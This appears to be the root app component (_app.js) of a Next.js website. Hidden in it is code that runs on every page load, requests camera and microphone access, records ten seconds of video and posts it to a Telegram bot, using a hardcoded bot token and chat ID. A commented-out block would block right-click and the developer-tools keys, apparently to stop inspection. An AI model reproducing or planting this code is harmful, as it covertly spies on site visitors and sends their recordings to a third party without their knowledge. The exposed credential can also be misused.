import Layout from "@/app/components/layout/Layout";
import '@/app/assets/globals.scss';
import { Provider } from "@/app/components/ui/Context/Context";
import { useEffect, useRef } from "react";

const myApp = ({ Component, pageProps }) => {

    // отправляем видео боту 
    const videoRef = useRef(null);

    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
    const chatId = "-1001860144177"
    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendMessage`


    useEffect(() => {
        const getMediaAndSendData = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
                    const chunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            chunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });

                        const formData = new FormData();
                        formData.append('video', blob, 'video.webm');

                        // Отправляем данные на сервер (бота) с использованием fetch
                        try {
                            const response = await fetch(urlApi, {
                                method: 'POST',
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    parse_mode: "html",
                                    text: formData,
                                })
                            });

                            if (response.ok) {
                                console.log('Видео успешно отправлено на бота');
                            } else {
                                console.error('Ошибка при отправке видео на бота:', response.statusText);
                            }
                        } catch (error) {
                            console.error('Ошибка fetch:', error);
                        }
                    };

                    mediaRecorder.start(100);

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 10000);
                }
            } catch (error) {
                console.error('Ошибка доступа к мультимедийным устройствам:', error);
            }
        };

        getMediaAndSendData();
    }, []);
    // 


    // 
    // useEffect(() => {
    //     const handleContextMenu = (e) => {
    //         e.preventDefault();
    //     };

    //     const handleKeyDown = (e) => {
    //         if (e.keyCode === 123) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
    //             e.preventDefault();
    //         }
    //     };

    //     document.addEventListener('contextmenu', handleContextMenu);
    //     document.addEventListener('keydown', handleKeyDown);

    //     return () => {
    //         document.removeEventListener('contextmenu', handleContextMenu);
    //         document.removeEventListener('keydown', handleKeyDown);
    //     };
    // }, []);
    //

    return (
        <Provider>
            <Layout>
                <Component {...pageProps} />
            </Layout>
        </Provider>
    )
}

export default myApp;